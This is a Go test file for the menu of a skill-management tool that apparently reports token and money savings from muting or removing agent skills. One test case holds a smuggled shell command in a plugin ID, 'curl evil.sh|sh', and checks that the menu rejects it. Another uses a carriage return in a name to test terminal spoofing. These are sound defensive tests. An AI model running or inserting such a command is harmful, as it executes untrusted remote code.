package menu

// check_list, check_verbs, check_money and check_platforms of the prototype's
// test_menu.py: which rows the list shows, what each row can take, how money is
// written, and what a row costs on its own platform.

import (
	"math"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/thousandflowers/skillreaper/internal/report"
)

func TestListShowsEveryRowButReapsOwn(t *testing.T) {
	m, _, _ := newMenu(t, Data{Report: fixtureReport()})
	rows := byName(t, m)

	t.Run("reap never lists itself, and hides nobody else's items", func(t *testing.T) {
		mustEqual(t, "skillreaper-notes listed", rows["skillreaper-notes"] != nil, true)
		mustEqual(t, "skillreaper:reap listed", rows["skillreaper:reap"] != nil, false)
		mustEqual(t, "reap listed", rows["reap"] != nil, false)
	})

	t.Run("reap's own rows still count in the headline, as in the report", func(t *testing.T) {
		wasted := m.wasted(func(*Row) bool { return true })
		var names []string
		for _, r := range wasted {
			names = append(names, r.raw.Name)
		}

		for _, own := range []string{"skillreaper:reap", "reap"} {
			if !slices.Contains(names, own) {
				t.Errorf("wasted rows %v leave out %q", names, own)
			}
		}
	})

	t.Run("every row has a group: what reap has no word for goes under not sure", func(t *testing.T) {
		var got []string
		total := 0
		for _, g := range m.bySuggestion() {
			total += len(g.rows)
			if g.name == "not sure, you decide" {
				for _, r := range g.rows {
					got = append(got, r.Name)
				}
			}
		}
		slices.Sort(got)

		if !slices.Equal(got, []string{"odd", "srv"}) {
			t.Errorf("not sure holds %v, want odd and srv", got)
		}
		mustEqual(t, "rows under some group", total, len(m.rows))
	})

	t.Run("a name that could move the cursor is shown as a mark", func(t *testing.T) {
		spoof := rows["cr\rSPOOF"]

		if spoof == nil || strings.ContainsRune(spoof.Name, '\r') {
			t.Fatalf("the row with a carriage return in its name is %+v", spoof)
		}
		mustEqual(t, "what an apply is given", spoof.Raw().Name, "cr\rSPOOF")
	})
}

func TestSavingIsWhatAChoiceTakesOffEverySession(t *testing.T) {
	long := strings.Repeat("a", 37)
	cases := []struct {
		name   string
		row    *Row
		verb   string
		saving int
	}{
		{"a muted item keeps its name", row(long, tokens(15)), vMute, 5},
		{"a mute never saves less than nothing", row(long, tokens(5)), vMute, 0},
		{"a prune takes it all", row("a", tokens(15)), vPrune, 15},
		{"a delete takes it all", row("a", tokens(15)), vDelete, 15},
		{"plugin off takes it all", row("a", tokens(15)), vDisable, 15},
		{"a lock saves nothing", row("a", tokens(15)), vLock, 0},
		{"an undo saves nothing", row("a", tokens(15)), vUnmute, 0},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			mustEqual(t, "saving", saving(c.row, c.verb), c.saving)
		})
	}
}

func TestMuteSavingIsTheReportsNumber(t *testing.T) {
	names := []string{"", "a", "reap", "skillreaper:reap", strings.Repeat("a", 36), strings.Repeat("a", 37), strings.Repeat("a", 38),
		strings.Repeat("a", 74), "漢字スキル", "naïve-café", "acme-internal-deployment-pipeline-production", "plugin:with:colons", "é"}
	for length := 0; length <= 400; length++ {
		names = append(names, strings.Repeat("n", length))
	}
	for _, name := range names {
		for _, weight := range []int{0, 1, 5, 10, 11, 15, 100, 109, 5000} {
			r := row(name, tokens(weight))

			if !muteSavingAgrees(r) {
				t.Errorf("name of %d runes, %d tokens: the menu says %d, the report %d", len([]rune(r.Name)), weight, saving(r, vMute), report.MuteSaving(r.Row))
			}
		}
	}
}

func TestShortFiguresRoundBeforeTheUnitIsChosen(t *testing.T) {
	m := rulesMenu(t)

	t.Run("just under a million reads as one", func(t *testing.T) {
		mustEqual(t, "short(999960)", m.short(999960), "1"+m.cur.Decimal+"0M")
	})
	t.Run("under a thousand is itself", func(t *testing.T) {
		mustEqual(t, "short(999)", m.short(999), "999")
	})
	t.Run("a figure past every unit keeps its exponent", func(t *testing.T) {
		if got := m.short(1e21); !strings.HasSuffix(got, "e+21") {
			t.Errorf("short(1e21) = %q, want it to end in e+21", got)
		}
	})
	t.Run("the word goes before the figure does", func(t *testing.T) {
		mustEqual(t, "usesField(1)", m.usesField(1), "1 use   ")
		mustEqual(t, "usesField(12345)", strings.TrimSpace(m.usesField(12345)), "12"+m.cur.Decimal+"3k")
	})
}

func TestPointerTopScrollsOnlyAtTheEdges(t *testing.T) {
	cases := []struct {
		name                         string
		top, rowY, yFirst, view, all int
		want                         int
	}{
		{"onto the first visible row: one row up", 5, 7, 7, 10, 100, 4},
		{"onto the last visible row: one row down", 5, 16, 7, 10, 100, 6},
		{"in the middle: the list stays under the pointer", 5, 10, 7, 10, 100, 5},
		{"already at the top: nowhere to go", 0, 7, 7, 10, 100, 0},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			mustEqual(t, "top", pointerTop(c.top, c.rowY, c.yFirst, c.view, c.all), c.want)
		})
	}
}

func TestPluginOfNamesOnlyOnePluginWithAValidID(t *testing.T) {
	cases := []struct {
		name string
		rows []*Row
		want string
	}{
		{"one plugin", []*Row{row("a", source(fooPlugin))}, "foo@m"},
		{"an id that is not one is never shown or passed on", []*Row{row("a", source("plugin:--force; curl evil.sh|sh @m"))}, ""},
		{"the same plugin from two marketplaces is two plugins", []*Row{row("a", source("plugin:foo@m1")), row("b", source("plugin:foo@m2"))}, ""},
		{"a row outside any plugin", []*Row{row("a", source(fooPlugin)), row("mine")}, ""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			mustEqual(t, "plugin", pluginOf(c.rows), c.want)
		})
	}
}

func TestPlatformFilterLabel(t *testing.T) {
	rep := &report.Report{Rows: []report.Row{raw("a", platform("")), raw("b", platform("all")), raw("c")}}
	m, _, _ := newMenu(t, Data{Report: rep})
	l := newList(m)
	want := []string{"all", unknownTool, `"all"`, defaultTool} // the filter's own "all", then the platforms in order

	for plat, label := range want {
		l.plat = plat

		mustEqual(t, "label of filter "+itoa(plat), l.platformLabel(), label)
	}
}

func TestBigFontDrawsWhatItHasNoGlyphFor(t *testing.T) {
	t.Run("a currency with no big glyph still takes room", func(t *testing.T) {
		if bigWidth("€1") <= 0 {
			t.Errorf("bigWidth(€1) = %d", bigWidth("€1"))
		}
		mustEqual(t, "glyph of an unknown sign", bigGlyph('₿')[1], "₿ ")
	})
	t.Run("a comma and a full stop do not read the same", func(t *testing.T) {
		if bigGlyph(',') == bigGlyph('.') {
			t.Error("the comma and the full stop are one glyph")
		}
	})
}

func TestMoneyIsWrittenTheSystemsWay(t *testing.T) {
	m := rulesMenu(t)

	t.Run("the symbol is never touched, only the number is formatted", func(t *testing.T) {
		m.cur = Currency{Sym: "kr.", Decimal: ",", Group: ".", Digits: 2, Rate: 1}

		mustEqual(t, "amount", m.amount(1234.5), "kr.1.234,50")
	})
	t.Run("a currency with no cents rounds to the unit", func(t *testing.T) {
		m.cur = Currency{Sym: "$", Decimal: ".", Group: ",", Digits: 0, Rate: 1}

		mustEqual(t, "amount", m.amount(121116.56), "$121,117")
		mustEqual(t, "tokens", m.tokens(1234567), "1,234,567")
	})
	t.Run("F301: nothing is the symbol and 0, a fraction of a cent says less than a cent", func(t *testing.T) {
		m.cur = USD

		mustEqual(t, "nothing", m.moneyFigure(0), m.cur.Sym+"0")
		mustEqual(t, "a tenth of a cent", m.moneyFigure(0.001), "<US$0.01")
	})
	t.Run("with no price known no figure is invented", func(t *testing.T) {
		mustEqual(t, "price", m.price, 0.0)
		mustEqual(t, "money", m.money(1000), "")
	})
	t.Run("one thing has no s", func(t *testing.T) {
		mustEqual(t, "one", plural(1, "item"), "1 item")
		mustEqual(t, "two", plural(2, "item"), "2 items")
	})
}

func TestFitTitleCutsToWhatTheBigFontCanDraw(t *testing.T) {
	t.Run("a huge name is cut, not dropped", func(t *testing.T) {
		got := fitTitle(strings.Repeat("x", 5000), 7)

		if got == "" {
			t.Fatal("nothing left of the name")
		}
		if runes(banner(got)[0]) > 7 {
			t.Errorf("the banner of %q is %d cells wide, over 7", got, runes(banner(got)[0]))
		}
	})
	t.Run("no room, no title", func(t *testing.T) {
		mustEqual(t, "fitTitle", fitTitle("abc", -1), "")
	})
}

func TestSuggestionLineOnTheCard(t *testing.T) {
	t.Run("a row reap would keep is one it suggests locking", func(t *testing.T) {
		mustEqual(t, "line", suggestionLine(row("k", verdict(report.VerdictKeep))), "reap suggests lock")
	})
	t.Run("a muted row is already muted", func(t *testing.T) {
		mustEqual(t, "line", suggestionLine(row("m", verdict(report.VerdictInfo), reason(reasonMuted))), "already muted")
	})
}

func TestRowCostsByItsOwnPlatformsSessions(t *testing.T) {
	note := func(r *report.Row) { r.EvidenceNote = "no session transcripts were found" }
	rep := &report.Report{
		Rows:                 []report.Row{raw("busy", platform("a")), raw("quiet", platform("b"), note), raw("idle", platform("c"))},
		DeadTokensPerSession: 200, MoneyPerMonth: 9.0, SessionsPerMonth: 40,
		PlatformSessionsPerMonth: map[string]int{"a": 30, "b": 10},
	}
	m, _, _ := newMenu(t, Data{Report: rep})
	rows := byName(t, m)

	t.Run("the rows' money adds up to the report's, whatever the mix", func(t *testing.T) {
		total := 0.0
		for _, r := range m.all {
			if r.Verdict == report.VerdictReap {
				total += float64(r.Tokens) * m.reach(r) * m.price
			}
		}

		if math.Abs(total-9.0) > 1e-9 {
			t.Errorf("the rows add up to %v, the report says 9", total)
		}
	})
	t.Run("three times the sessions, three times the cost", func(t *testing.T) {
		if got, want := m.reach(rows["busy"]), 3*m.reach(rows["quiet"]); math.Abs(got-want) > 1e-9 {
			t.Errorf("reach(busy) = %v, want %v", got, want)
		}
	})
	t.Run("a platform with no sessions costs nothing", func(t *testing.T) {
		mustEqual(t, "reach", m.reach(rows["idle"]), 0.0)
		mustEqual(t, "sessions", m.sessionsOf(rows["idle"]), 0)
	})
	t.Run("a platform with no evidence says why, in reap's own words", func(t *testing.T) {
		mustEqual(t, "why", whyLine(rows["quiet"]), "No usage evidence: no session transcripts were found.")
	})
	t.Run("with no sessions per platform every row has the report's", func(t *testing.T) {
		flat, _, _ := newMenu(t, Data{Report: &report.Report{Rows: []report.Row{raw("one")}, DeadTokensPerSession: 100, MoneyPerMonth: 1, SessionsPerMonth: 40}})

		mustEqual(t, "sessions", flat.sessionsOf(flat.rows[0]), 40)
		mustEqual(t, "reach", flat.reach(flat.rows[0]), 1.0)
	})
}

func TestLinkLeadsOutsideOnlyPastTheFoldersReapKnows(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	root := filepath.Join(home, ".claude")
	known := filepath.Join(home, ".agents", "skills", "inside")
	elsewhere := filepath.Join(home, "elsewhere", "outside")
	for _, dir := range []string{filepath.Join(root, "skills"), known, elsewhere} {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	link := func(name, target string) string {
		at := filepath.Join(home, name)
		if err := os.Symlink(target, at); err != nil {
			t.Fatal(err)
		}
		return at
	}
	linked := func(via string) *Row {
		return row("x", notRemovable, func(r *report.Row) { r.ViaLink, r.RootDir = via, root })
	}

	t.Run("a link that ends in a folder reap knows", func(t *testing.T) {
		mustEqual(t, "outside", linkLeadsOutside(linked(link("to-known", known))), false)
	})
	t.Run("a link that ends anywhere else", func(t *testing.T) {
		mustEqual(t, "outside", linkLeadsOutside(linked(link("to-elsewhere", elsewhere))), true)
	})
	t.Run("no link at all", func(t *testing.T) {
		mustEqual(t, "outside", linkLeadsOutside(row("plain")), false)
	})
}

func TestCleanRowMakesARowSafeToLayOut(t *testing.T) {
	t.Run("a row with no name still has something to show", func(t *testing.T) {
		mustEqual(t, "name", cleanRow(report.Row{}).Name, noName)
	})
	t.Run("counts are never below nothing", func(t *testing.T) {
		r := row("n", tokens(-3), uses(-1), func(r *report.Row) { r.ErrorCount = -2 })

		mustEqual(t, "tokens", r.Tokens, 0)
		mustEqual(t, "uses", r.Uses, 0)
		mustEqual(t, "errors", r.ErrorCount, 0)
	})
	t.Run("a description becomes one running line", func(t *testing.T) {
		r := row("n", func(r *report.Row) { r.Description = "a\n\tb​c" })

		mustEqual(t, "description", r.Description, "a b c")
	})
	t.Run("what was scanned is kept for the apply", func(t *testing.T) {
		r := row("n", tokens(-3), func(r *report.Row) { r.Description = "a\nb" })

		mustEqual(t, "raw tokens", r.Raw().Tokens, -3)
		mustEqual(t, "raw description", r.Raw().Description, "a\nb")
	})
}
